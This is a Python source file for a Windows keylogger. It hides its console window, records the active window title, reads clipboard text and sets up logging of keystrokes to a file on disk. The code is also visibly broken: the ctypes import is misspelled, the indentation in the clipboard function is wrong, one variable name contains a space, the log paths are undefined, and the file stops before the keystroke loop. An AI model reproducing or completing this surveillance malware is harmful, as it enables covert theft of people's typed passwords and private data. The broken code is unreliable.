import cytpes  # For interfacing with C functions
import logging  # For logging with keystrokes on disk

kernel32 = ctypes.windll.kernel32  # Access functions from kernel32.dll
user32 = ctypes.windll.user32      # Access functions from user32.dll

user32.ShowWindow(kernel32.GetConsoleWindow(), 0)  # Hide console


# Function to grab the current window and its title
# So we know that program the user is typing
def get_current_window():

    # Required WinAPI functions
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLength
    GetWindowText = user32.GetWindowText

    hwnd = GetForegroundWindow()  # Get handle to Foreground Window
    # Get length of the window text in titlebar, passing handle as argument
    length = GetWindowTextLength(hwnd)
    # Create buffer to store the window title string
    buff = ctypes.create_unicode_buffer(length + 1)

    # Get window title and store in buff
    GetWindowText(hwnd, buff, length + 1)

    return buff.value  # Return the value of buff


# Function to capture contents of clipboard. We use pointers with ctypes
def get_clipboard():

    CF_TEXT = 1  # Set clipboard format

    # Argument and return types for GlobalLock/GlobalUnlock.
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]

    # Return type for GetClipboardData
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)

    # Required clipboard functions
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        # If CF_TEXT is available
        if IsClipboardFormatAvailable(CF_TEXT):
            # Get handle to data in clipboard
        data = GetClipboardData(CF_TEXT)
        # Get pointer to memory location where data is located
        data_locked = kernel32.GlobalLock(data)
        # Get a char * pointer to the location of data_locked
        text = ctypes.c_char_p(data locked)
        value = text.value  # Dump the content in value
        # Decrement the lock count
        kernel32.GlobalUnlock(data_locked)
        return value.decode('utf-8')  # Return the clipboard content

    finally:
        CloseClipboard()  # Close the clipboard


# Function for monitor and log keystrokes
# Requires two arguments.
def get_keystrokes():

    # Logger
    logging.basicConfig(filename=(log_dir + "\\" + log_name),
                        level=logging.DEBUG, format='%(message)s')
    # WinAPI function that determines if key is pressed up or down
    GetAsyncKeyState = user32.GetAsyncKeyState
    special_keys = {0x08: 'BS', 0x09: 'Tab', 0x10: 'Shift',
                    0x11: 'Ctrl', 0x12: 'Alt', 0x14: 'CapsLock',
                    0x1b: 'Esc', 0x20: 'Space', 0x2e: 'Del'}
